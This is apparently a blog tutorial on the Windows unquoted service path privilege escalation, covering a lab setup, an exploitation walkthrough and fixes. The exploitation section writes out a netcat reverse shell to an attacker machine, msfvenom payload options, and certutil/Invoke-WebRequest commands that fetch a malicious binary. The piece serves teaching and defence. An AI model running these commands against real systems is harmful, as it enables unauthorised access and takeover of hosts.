I"‹Z<h1 id="what-is-unquoted-service-path-">What is Unquoted Service Path ?</h1>

<p><strong>Unquoted Service Path</strong> is a vulnerability that occurs when a service is created with a <strong>service path</strong> without appropriate
quoting surrounding the path string, and if the path contains spaces, that can end up with a <strong>privilege escalation</strong> with the
permissions of whoever created the service.</p>

<h1 id="how-it-works-">How it works ?</h1>

<p>Typically <a href="https://en.wikipedia.org/wiki/Service_Control_Manager"><strong>Service Control Manager</strong></a> will run the service‚Äôs executable
by looking at its full path.</p>
<ul>
  <li>Path of the safe service -&gt; ‚ÄúC:\Program Files\a folder\b folder\c folder\vulnservice.exe‚Äù</li>
</ul>

<p>The service control manager will execute vulnservice.exe due to the fact that the path has appropriate quoting. 
<br />Basically, the system will interpret the path as a full string. 
<br />
<br />
However, if the full path of the service file is not enclosed within quotation marks just like the following example:</p>
<ul>
  <li>Path of the vulnerable service -&gt; C:\Program Files\a folder\b folder\c folder\vulnservice.exe</li>
</ul>

<p>This time, for each space in the path, the system will append the <strong>.exe</strong> extension at the end of the most recent 
space. Thus the first string chunk of the folder name will be treated as an executable.
<br />Interpretation would be as following:</p>

<ol>
  <li>C:\<strong>Program.exe</strong></li>
  <li>C:\Program Files\<strong>a.exe</strong> : If Progam.exe does not exist, execute a.exe</li>
  <li>C:\Program Files\a folder\<strong>b.exe</strong> : If a.exe does not exist, execute b.exe</li>
  <li>C:\Program Files\a folder\b folder\<strong>c.exe</strong> : If b.exe does not exist, execute c.exe</li>
  <li>C:\Program Files\a folder\b folder\c folder\<strong>vulnservice.exe</strong> : If c.exe does not exist, execute vulnservice.exe</li>
</ol>

<h1 id="how-to-exploit-it-">How to exploit it ?</h1>

<p>Consider that you have gained a shell from a low privileged user in the system. However that user has the write permission
for one of these subfolders. Then you can deploy a malicious executable inside that subfolder by naming it with the the 
first string chunk of its child folder.</p>

<p><br />Lets assume that the user that you have gained access to has the write permission for the b folder. If you create a malware 
named a.exe and drop it inside the b folder, the system will run your executable at the next run of the service.</p>

<h1 id="setting-the-lab">Setting the Lab</h1>

<p>In order to exploit the vulnerability, we need to create one.
<br /></p>

<p>Open up the start menu, and launch a command prompt by running it as an administrator.
<br /><img src="/assets/img/posts/unquoted-service-path-vulnerability/1.jpg" alt="" /><br /><br /></p>

<p>Create a low privileged user:
<code class="language-plaintext highlighter-rouge">net user krygen krygen /add</code>
<img src="/assets/img/posts/unquoted-service-path-vulnerability/2.jpg" alt="" /><br /><br />
Press <strong>Win+R</strong>, and run <strong>lusrmgr.src</strong>, to see all users and groups in the system.
<br />You can see the user krygen has been created successfully.
<br />It is also possbile to run ‚Äò<strong>net user krygen</strong>‚Äô to get same information from the command line.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/3.jpg" alt="" /><br /><br />
And the account belongs to the <strong>Users Group</strong>.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/4.jpg" alt="" /><br /><br />
To create a vulnerable service run this command:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="s2">"Vuln Service"</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="w">
</span><span class="s2">"C:\Proogram Files\a folder\b folder\c folder\vulnservice.exe"</span><span class="w"> </span><span class="n">Displayname</span><span class="o">=</span><span class="w"> </span><span class="s2">"Vulnerable Service"</span><span class="w"> </span><span class="n">start</span><span class="o">=</span><span class="w"> </span><span class="n">auto</span></code></pre></figure>

<ul>
  <li>sc.exe is the utility to create and interact with the services.</li>
  <li>binpath is the path of the binary executable of the service.</li>
  <li>Displayname is not mandatory, if you leave it blank, it will take the name of the service.</li>
  <li>start is the start type, it can be either auto or manual.</li>
</ul>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/5.jpg" alt="" /><br /><br />
<br /> We can see the details of any service by runnig ‚Äò<strong>sc qc {SERVICE NAME}</strong>‚Äô.
<br />Important fields to notice:</p>
<ul>
  <li>START_TYPE = AUTO_START -&gt; Service will start automatically when the sytem boots.</li>
  <li>SERVICE_START_NAME = LocalSystem -&gt; Service will start with the LocalSystem service account privileges.</li>
</ul>

<p><a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN"><strong>LocalSystem</strong></a> is a 
service account, and it has the highest privileges of the system, which is the system root.
<br /> Read more about <a href="https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco"><strong>Microsoft Service Accounts</strong></a>.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/6.jpg" alt="" /><br /><br />
Let create directories which is declared as a path for our service.</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">mkdir</span><span class="w"> </span><span class="s2">"C:\Program Files\a folder\b folder\c folder"</span></code></pre></figure>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/7.jpg" alt="" /><br /><br />
As you can see, it is not possible to start the service since the there is no executable in path.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/8.jpg" alt="" /><br /><br /></p>

<p>I will create two executables, both will delete different txt files from a specified path.
<br />One will delete <strong>burak.txt</strong> and the other, <strong>krygen.txt</strong>, for every 3 seconds.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/9.jpg" alt="" /><em>Source code for vulnservice.exe</em><br /><br />
<img src="/assets/img/posts/unquoted-service-path-vulnerability/10.jpg" alt="" /><em>Source code for b.exe</em><br /><br />
I have compiled both C codes with GCC and converted them into executables.
<br /><a href="https://sourceforge.net/projects/gcc-win64/"><strong>Download gcc compiler</strong></a>
<img src="/assets/img/posts/unquoted-service-path-vulnerability/11.jpg" alt="" /><br /><br /></p>

<p>Put the <strong>vulnservice.exe</strong> into the <strong>c folder</strong>. When I start the service manually, starting from <strong>C:\</strong>, the system will 
try to execute Program.exe then a.exe, then b.exe, then c.exe.However, none of them will be found. Thus vulnservice.exe will 
be executed as expected behaviour.
<br /><br />
Let run the service:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="s2">"Vuln Service"</span></code></pre></figure>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/12.jpg" alt="" /><em>First run: 0th second</em><br /><br />
<img src="/assets/img/posts/unquoted-service-path-vulnerability/13.jpg" alt="" /><em>3rd second</em><br /><br /></p>

<p>Now put b.exe in a folder, then start the service again.
<br />Remember the execution the we have discussed at the beginning.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/14.jpg" alt="" /><em>First run: 0th second</em><br /><br />
As you can see, this time krygen.txt had been deleted instead of burak.txt, which is catastrophic for the system,
but it was what we were expecting.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/15.jpg" alt="" /><em>3rd second</em></p>

<h1 id="exploitation">Exploitation</h1>

<p>We have set the environment up. However, until now, we had access to admin privileges. Thus we were able to start the service 
manually and write any of the subdirectories of the service path.
<br />As the name suggests <strong>privilege escalation</strong>, is about raising our permissions to the LocalSystem/root permissions from
a lower privileged user. There is no point to exploit a vulnerability after you have complete control over the system.
<br /><br />
Let‚Äôs check the the <a href="https://networkencyclopedia.com/access-control-list-acl/"><strong>ACL(Access Control List)</strong></a> of the ‚ÄòC:\Program Files\a folder‚Äô with <a href="https://www.techtarget.com/searchwindowsserver/definition/icacls"><strong>icacls</strong></a>. 
<br /><br />Run:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\a folder"</span></code></pre></figure>

<p><br />The Users Group entry, <strong>BUILTIN\Users:(I)(RX)</strong>, gives access <strong>read</strong> and <strong>execute</strong> permissions 
for every user who belongs to <strong>Users Group</strong>. The <strong>krygen</strong> user we have created at the beginning of the 
post belongs to the Users Group. However, for the vulnerability to occur ,Users Group needs the <strong>write</strong> 
permission for any of those subfolders, a,b or c, it does not matter which. For this example I will use <strong>a folder</strong>.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/16.jpg" alt="" /><br /><br /></p>

<p>Let us grant write access to Users Group for <strong>a folder</strong>.
<br /><br />Run:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\a folder"</span><span class="w"> </span><span class="nx">/grant</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="p">:</span><span class="nx">W</span></code></pre></figure>

<p>Then run:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\a folder"</span></code></pre></figure>

<p>This time you will see a new entry <strong>BUILTIN\Users:(W)</strong>
<br /><br />Now the user we have created, krygen, can write to that specific directory.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/17.jpg" alt="" /><br /><br /></p>

<p>Log in to the system with the account that you have created which belongs to the Users Group, for me it is krygen user.
<br />We will assume that, somehow you have gained accessed to the system as the user krygen.
<br />I will use <a href="https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe"><strong>netcat</strong></a>
in order to establish a connection and take a shell from krygen to my attacker machine.
<br /><br />Run this on the attacker machine:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">nc</span><span class="w"> </span><span class="nt">-nvlp</span><span class="w"> </span><span class="p">{</span><span class="n">SOME</span><span class="w"> </span><span class="nx">FREE</span><span class="w"> </span><span class="nx">PORT</span><span class="p">}</span></code></pre></figure>

<p>Run that on the windows machine:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">nc</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w"> </span><span class="p">{</span><span class="n">IP</span><span class="w"> </span><span class="nx">OF</span><span class="w"> </span><span class="nx">THE</span><span class="w"> </span><span class="nx">ATTACKER</span><span class="w"> </span><span class="nx">MACHINE</span><span class="p">}</span><span class="w"> </span><span class="p">{</span><span class="n">PORT</span><span class="w"> </span><span class="nx">THE</span><span class="w"> </span><span class="nx">ATTACKER</span><span class="w"> </span><span class="nx">MACHINE</span><span class="w"> </span><span class="nx">LISTENS</span><span class="w"> </span><span class="nx">TO</span><span class="p">}</span></code></pre></figure>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/18.jpg" alt="" /><br /><br />
Now that we have access to the krygen‚Äôs shell, we can try to write to all those a,b and c folders by attempting to create a 
new folder in each of them to test which one of them is accessible. We already know it is <strong>a folder</strong>, no harm double-checking.</p>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/19.jpg" alt="" /><em>Folder creation is successfull inside ‚Äòa folder‚Äô</em><br /><br />
<img src="/assets/img/posts/unquoted-service-path-vulnerability/20.jpg" alt="" /><em>Failed to create folder inside ‚Äòb folder‚Äô</em><br /><br />
<img src="/assets/img/posts/unquoted-service-path-vulnerability/21.jpg" alt="" /><em>Failed to create folder inside ‚Äòc folder‚Äô</em><br /><br /></p>

<p>Since the directory that we can write is the <strong>a folder</strong>, if we want the service to execute our binary executable
instead of the service file, the name of the malicious executable should be the first chunk of the child directory, which is
<strong>b</strong>.exe.
<br />
I am going to use <a href="https://www.offensive-security.com/metasploit-unleashed/Msfvenom/"><strong>msfvenom</strong></a> to create a reverse shell
binary back to my machine.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parameter</th>
      <th style="text-align: left">Functionality</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">LHOST</td>
      <td style="text-align: left">The IP address that the reverse shell will connect</td>
    </tr>
    <tr>
      <td style="text-align: left">LPORT</td>
      <td style="text-align: left">The port that the reverse shell will connect</td>
    </tr>
    <tr>
      <td style="text-align: left">-p</td>
      <td style="text-align: left">Payload to use</td>
    </tr>
    <tr>
      <td style="text-align: left">-o</td>
      <td style="text-align: left">Name of the file</td>
    </tr>
    <tr>
      <td style="text-align: left">-f</td>
      <td style="text-align: left">File type of the output binary</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/22.jpg" alt="" /><br /><br /></p>

<p>Now we need to download the executable to the victim machine.
<br />Run this in the directory that your executable locates. It will start a web server inside of that directory.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python <span class="nt">-m</span> http.server 80</code></pre></figure>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/23.jpg" alt="" /><br /><br />
<br />You can download any file from the running python server by using one of these utilites.</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</span><span class="w">
</span><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">IP</span><span class="p">(</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">)}:</span><span class="mi">80</span><span class="n">/</span><span class="p">{</span><span class="n">THE</span><span class="w"> </span><span class="nx">FILE</span><span class="w"> </span><span class="nx">YOU</span><span class="w"> </span><span class="nx">WANT</span><span class="w"> </span><span class="nx">TO</span><span class="w"> </span><span class="nx">DOWNLOAD</span><span class="p">}</span></code></pre></figure>

<p>Double-check to see if the executable downloaded successfully into the directory to which you have the write access.</p>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/24.jpg" alt="" /><br /><br />
Start a <strong>netcat</strong> listener on the port you declared in the reverse shell binary.</p>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/25.jpg" alt="" /><br /><br /></p>

<p>Since we do not have <strong>LocalSystem</strong> permissions, it is impossible to start the service manually. However, the start type of the 
service is <strong>AUTO_START</strong>. Thus the service will be initialized at the system boot. All we have to do is reboot the system
and wait for the connection to establish.
<br />Run:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sutdown</span><span class="w"> </span><span class="nx">/r</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">0</span></code></pre></figure>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/27.jpg" alt="" /><br /><br /></p>

<p>Hurray ! The connection has been established successfully, even though no login had not yet been attempted on the windows machine.
The path we are in is <strong>system32</strong>, which means we have the console with administrator rights, 
have fun after that point :))).
<img src="/assets/img/posts/unquoted-service-path-vulnerability/28.jpg" alt="" /><br /><br /></p>

<h1 id="how-to-fix-it-">How to fix it ?</h1>

<p>First of all, run this to see if there is any service with an unquoted path variable.:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">auto</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"C:\Windows\"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"""</span></code></pre></figure>

<p><img src="/assets/img/posts/unquoted-service-path-vulnerability/29.jpg" alt="" /><br /><br /></p>

<p>If there is, then press <strong>Win+R</strong> and type <strong>regedit.exe</strong>, press enter.
<br />In the directory tree, search for the vulnerable service name under:<br /> <strong>Computer\HKEY_LOCAL_MACHINE\SYSTEM
\ControlSet\Services\{SERVICE NAME}</strong>.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/31.jpg" alt="" /><br /><br /></p>

<p>Find the <strong>ImagePath</strong> entry, double click it.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/32.jpg" alt="" /><br /><br /></p>

<p>Change its value by surrounding the string with quotes.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/33.jpg" alt="" /><br /><br /></p>

<p>Run again, this time you should not see any results, you have fixed it:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">auto</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"C:\Windows\"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"""</span></code></pre></figure>

<h1 id="how-to-prevent-it-">How to prevent it ?</h1>

<p>How on the world I can create a safe service ?
<br /> Simple, when creating a service with <code class="language-plaintext highlighter-rouge">sc.exe</code>, do not pass the parameter for <strong>binpath</strong> like this:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Program Files\a folder\b folder\c folder"</span></code></pre></figure>

<p>Instead, do it like this:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">"\"</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\a</span><span class="w"> </span><span class="nx">folder\b</span><span class="w"> </span><span class="nx">folder\c</span><span class="w"> </span><span class="nx">folder</span><span class="s2">"\"</span></code></pre></figure>

<p>Enjoy your safely created service.
<img src="/assets/img/posts/unquoted-service-path-vulnerability/35.jpg" alt="" /><br /><br /></p>

<p>Thanks for reading.</p>
:ET